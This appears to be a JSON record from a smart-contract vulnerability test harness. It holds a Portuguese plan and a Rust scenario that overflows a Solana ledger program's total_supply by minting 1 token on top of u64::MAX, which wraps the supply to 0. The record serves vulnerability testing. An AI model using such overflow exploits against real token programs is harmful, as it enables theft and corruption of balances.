{
  "plan": "O cenário inicializa a conta Ledger com total_supply = u64::MAX e user_balance = 0 usando a instrução initialize legítima. Em seguida, chama mint com amount = 1, que realiza wrapping_add e faz total_supply dar a volta para 0. O efeito medido é que total_supply resultante é 0, enquanto o uso legítimo (mint com amount pequeno) produziria um valor maior que o inicial.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];

let baseline = env.baseline("initialize ledger with max supply", &init_ix, &init_accounts);

let ledger_after_init = after(&baseline, &ledger_key).clone();

let mint_ix = env.anchor_ix(
    "mint",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let mint_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let r = env.attack("mint 1 to overflow total_supply", &mint_ix, &mint_accounts);

if r.program_result == ProgramResult::Success {
    let ledger_data = after(&r, &ledger_key).data();
    let total_supply = read_u64(ledger_data, 40);
    let user_balance = read_u64(ledger_data, 48);
    env.effect("total_supply wrapped to 0", total_supply == 0);
    env.effect("user_balance wrapped to 1", user_balance == 1);
}"
}

